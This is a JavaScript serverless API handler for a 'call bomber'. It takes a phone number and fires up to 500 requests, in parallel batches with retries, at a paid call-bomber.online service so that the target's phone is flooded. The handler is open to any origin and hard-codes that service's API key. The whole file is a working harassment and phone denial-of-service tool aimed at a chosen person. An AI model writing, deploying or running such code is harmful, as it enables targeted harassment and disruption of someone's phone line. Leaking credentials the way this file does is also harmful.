// api/smsb.js — call-bomber.online API version
export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ error: "POST only" });

  const body = req.body || {};
  const number = String(body.number || "").replace(/\D/g, "").slice(-10);
  const count  = Math.min(Math.max(parseInt(body.count || 1, 10), 1), 500);
  const delay  = Math.min(Math.max(parseFloat(body.delay || 0), 0), 5);
  const concurrency = Math.min(Math.max(parseInt(body.concurrency || 10, 10), 1), 30);

  if (number.length < 10) return res.status(400).json({ error: "bad number" });

  // ✅ call.py se API config
  const API_URL = "https://api.call-bomber.online/admin/paid/key";
  const API_KEY = "NK-E8F619BA-7EA1E855-A62CEC75";
  const TIMEOUT = 8000;
  const MAX_RETRIES = 3;

  async function singleCall(index) {
    const url = `${API_URL}?key=${API_KEY}&num=${number}`;

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
      try {
        const controller = new AbortController();
        const tid = setTimeout(() => controller.abort(), TIMEOUT);

        const r = await fetch(url, {
          method: "GET",
          headers: {
            "User-Agent": "Call-Bomber-Bot/2.0",
            "Accept": "application/json"
          },
          signal: controller.signal
        });

        clearTimeout(tid);
        const text = await r.text();

        if (r.ok) {
          // call.py jaisa success check
          let ok = true;
          try {
            const j = JSON.parse(text);
            if (j.status === "error" || j.success === false) ok = false;
          } catch { /* non-JSON = probably ok */ }

          if (ok) return { index, ok: true, status: r.status };
        }

        // retry with backoff
        await new Promise(r => setTimeout(r, 500 * Math.pow(2, attempt)));
      } catch (e) {
        if (attempt === MAX_RETRIES - 1) {
          return { index, ok: false, error: String(e.message || e) };
        }
        await new Promise(r => setTimeout(r, 500 * Math.pow(2, attempt)));
      }
    }
    return { index, ok: false, error: "max retries" };
  }

  // Parallel batches
  const results = [];
  const started = Date.now();

  for (let i = 0; i < count; i += concurrency) {
    const batch = [];
    const batchEnd = Math.min(i + concurrency, count);
    for (let j = i; j < batchEnd; j++) {
      batch.push(singleCall(j));
    }
    const batchResults = await Promise.all(batch);
    results.push(...batchResults);

    if (delay > 0 && batchEnd < count) {
      await new Promise(r => setTimeout(r, delay * 1000));
    }
  }

  const success = results.filter(r => r.ok).length;
  const failed = results.length - success;
  const duration = Date.now() - started;

  return res.status(200).json({
    success: true,
    total: count,
    sent: success,
    failed,
    duration_ms: duration,
    concurrency,
    speed: `${(count / (duration / 1000)).toFixed(2)} req/s`,
    api: "call-bomber.online"
  });
}
